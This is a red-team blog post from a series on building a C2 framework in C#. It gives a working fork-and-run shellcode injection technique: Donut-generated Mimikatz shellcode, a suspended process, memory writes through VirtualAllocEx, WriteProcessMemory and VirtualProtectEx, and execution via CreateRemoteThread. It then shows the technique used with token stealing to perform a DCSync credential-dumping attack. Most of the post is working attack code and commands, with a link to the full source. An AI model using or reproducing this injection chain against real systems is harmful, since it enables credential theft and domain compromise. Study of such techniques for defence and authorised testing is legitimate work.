---
title: Fork and Run Implementation in C# - Shellcode Injection
author: Fropops
date: 2023-06-21 08:00:00 +0800
categories: [Developpement]
tags: [C#, C2, Red Team, Fork and Run, Injection, WinAPI, Command Execution]
---

# Introduction

In the previous articles, we saw how to use the Windows API to create processes for the current user or with the rights of another user. Now, we will leverage this knowledge to inject malicious code that we want to execute.

# Shellcode Preparation

The first step is to generate our "shellcode". There are many resources available online about understanding and generating shellcode, but it is beyond the scope of this post series. Therefore, we will simply use [Donut](https://github.com/TheWover/donut), a program that automatically generates the required shellcode to execute a chosen Windows program (for this example, we will use the famous tool, Mimikatz):

```shell
/opt/donut/donut -i /mnt/Share/Utils/win/programs/mimikatz64.exe -f 1 -a 2 -o /mnt/Share/tmp/Payload.bin -p 'coffee exit'
```

![Donut Shellcode Generation](/assets/img/posts/ForkAndRun/injection-donut.png)

Now, we need to incorporate this file containing the binary code into our application to be able to inject it. For this post, we will simply add it as a resource in our .NET project:


To do this, go to the properties of our project

![Ressource - Properties](/assets/img/posts/ForkAndRun/injection-ressource-properties.png)


Choose the "Resource" tab and click on the link "This project does not contain a default resource file. Click here to create one."

![Ressource - Creation](/assets/img/posts/ForkAndRun/injection-ressource-create.png)


Change the resource type to "File".

![Ressource - File](/assets/img/posts/ForkAndRun/injection-ressource-files.png)


Click on "Add resource" and select the file we just generated.

![Ressource - Payload](/assets/img/posts/ForkAndRun/injection-ressource-addpayload.png)


To access the content of this resource from our program, we can use the following line of code:
```c#
var shellcode = Properties.Resources.Payload;
```

# Shellcode Injection

Before injecting this code into the process we will create, there is one more change to make. In this case, we are creating a process that will serve as a shell to run our malicious program. So when we start the process, we don't want it to execute its own code. To achieve this, we will start the process in a suspended state. Therefore, we will insert the following line into the process creation properties:

```c#
creationFlags |= PROCESS_CREATION_FLAGS.CREATE_SUSPENDED;
```

There are different ways to inject shellcode, and there are numerous resources available on this topic. We will use one of the simplest and most well-known techniques. By using the functions VirtualAllocEx, WriteProcessMemory, and VirtualProtectEx, we will create a memory space in the created process that is large enough to hold our shellcode, copy the binary code into that space, and make the memory space executable.

We need to import these three functions:

```c#
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(
	IntPtr hProcess,
	IntPtr lpAddress,
	int dwSize,
	AllocationType flAllocationType,
	MemoryProtection flProtect);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtectEx(
	IntPtr hProcess,
	IntPtr lpAddress,
	int dwSize,
	MemoryProtection flNewProtect,
	out MemoryProtection lpflOldProtect);

[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(
	IntPtr hProcess,
	IntPtr lpBaseAddress,
	byte[] lpBuffer,
	int nSize,
	out IntPtr lpNumberOfBytesWritten);
```

We also need to import the associated structures:

```c#
[Flags]
public enum AllocationType
{
	Commit = 0x1000,
	Reserve = 0x2000,
	Decommit = 0x4000,
	Release = 0x8000,
	Reset = 0x80000,
	Physical = 0x400000,
	TopDown = 0x100000,
	WriteWatch = 0x200000,
	LargePages = 0x20000000
}

[Flags]
public enum MemoryProtection
{
	Execute = 0x10,
	ExecuteRead = 0x20,
	ExecuteReadWrite = 0x40,
	ExecuteWriteCopy = 0x80,
	NoAccess = 0x01,
	ReadOnly = 0x02,
	ReadWrite = 0x04,
	WriteCopy = 0x08,
	GuardModifierflag = 0x100,
	NoCacheModifierflag = 0x200,
	WriteCombineModifierflag = 0x400
}
```

In our program, we use these functions to inject the code into the process:

```c#
var baseAddress = VirtualAllocEx(
   pInfo.hProcess,
   IntPtr.Zero,
   shellcode.Length,
   AllocationType.Commit |  AllocationType.Reserve,
   MemoryProtection.ReadWrite);

if (baseAddress == IntPtr.Zero)
	throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");


IntPtr bytesWritten = IntPtr.Zero;
if (!WriteProcessMemory(pInfo.hProcess, baseAddress, shellcode, shellcode.Length, out bytesWritten))
	throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

if (bytesWritten.ToInt32() != shellcode.Length)
	throw new InvalidOperationException($"Failed to write All the shellcode into the process");

if (!VirtualProtectEx(
	pInfo.hProcess,
	baseAddress,
	shellcode.Length,
	MemoryProtection.ExecuteRead,
	out _))
{
	throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
}
```

To execute the injected code, we can rely on the CreateRemoteThread function, which we need to import:

```c#
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateRemoteThread(
	IntPtr hProcess,
	IntPtr lpThreadAttributes,
	uint dwStackSize,
	IntPtr lpStartAddress,
	IntPtr lpParameter,
	uint dwCreationFlags,
	out IntPtr lpThreadId);
```

Then, we can use it as follows:
```c#
IntPtr threadres = IntPtr.Zero;
IntPtr thread = CreateRemoteThread(pInfo.hProcess, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

if (thread == IntPtr.Zero)
	throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
```

And here's the result :

![Injection - Mimikatz](/assets/img/posts/ForkAndRun/injection-mimikatz.png)

# What does it look like in our C2?

Assembling all the pieces we have prepared so far in our C2, we are able to execute malicious tools (such as Mimikatz) using the privileges of other users.


Let's use our "Fork And Run" implementation to try a DCSync attack with the current user:
![Injection - C2 - DCSync As Current User](/assets/img/posts/ForkAndRun/injection-c2-norights.png)

As expected, we do not have sufficient privileges for this attack.

Now, let's use Token manipulation to borrow the rights of the administrator logged in to our machine:

![Injection - C2 - Steal Token](/assets/img/posts/ForkAndRun/injection-c2-steal.png)

Let's repeat the attack from this new context:

![Injection - C2 - DCSync](/assets/img/posts/ForkAndRun/injection-c2-dcsync.png)

# Final Thoughts

This article demonstrates how to use the Windows API to inject shellcode in a newly created process, and how it's leveraged to execute hacking tools.

You can find the complete source code of this article on [Github](https://github.com/Fropops/OffensiveWinAPI/blob/main/TestForBlog/Injection.cs)